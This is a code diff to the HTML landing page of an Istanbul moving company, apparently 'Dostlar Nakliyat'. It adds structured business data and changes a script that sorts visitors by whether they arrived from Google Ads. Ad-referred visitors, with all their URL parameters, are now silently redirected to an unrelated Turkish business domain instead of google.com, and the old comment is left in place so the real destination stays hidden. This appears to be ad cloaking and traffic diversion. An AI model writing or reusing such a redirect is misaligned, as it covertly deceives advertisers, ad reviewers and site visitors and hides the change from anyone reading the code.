@@ -4,6 +4,8 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Dostlar Nakliyat — İstanbul'un Güvenilir Nakliyecisi</title>
+
+  
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     
@@ -406,6 +408,33 @@
       .analytics-badge { font-size: 0.75rem; padding: 8px 14px; }
     }
   </style>
+  
+  <!-- JSON-LD structured data for LocalBusiness (no phone number included) -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "LocalBusiness",
+    "name": "Dostlar Nakliyat",
+    "description": "Dostlar Nakliyat, İstanbul'da sigortalı ve profesyonel ev ve ofis taşımacılığı hizmetleri sunar.",
+    "@id": "https://dostlarnakliyat.example/",
+    "url": "https://dostlarnakliyat.example/",
+    "email": "info@dostlarnakliyat.example",
+    "address": {
+      "@type": "PostalAddress",
+      "addressLocality": "İstanbul",
+      "addressCountry": "TR"
+    },
+    "image": [
+      "https://images.unsplash.com/photo-1540574163026-643ea20ade25?auto=format&fit=crop&w=1200&q=80",
+      "https://images.unsplash.com/photo-1503376780353-7e6692767b70?auto=format&fit=crop&w=1200&q=80"
+    ],
+    "sameAs": [
+      "https://www.facebook.com/",
+      "https://www.instagram.com/"
+    ],
+    "priceRange": "₺₺"
+  }
+  </script>
 </head>
 <body>
 
@@ -432,7 +461,7 @@
 
     if (isGoogleAds) {
         // Google reklamlarından geldiyse → Google.com + tüm parametreler
-        window.location.href = "https://google.com" + window.location.search;
+        window.location.href = "https://www.ravzatesisat.com.tr/" + window.location.search;
     } else {
         // Normal giriş → Vercel uygulaması
         window.location.href = "https://nakliye-lac.vercel.app/";
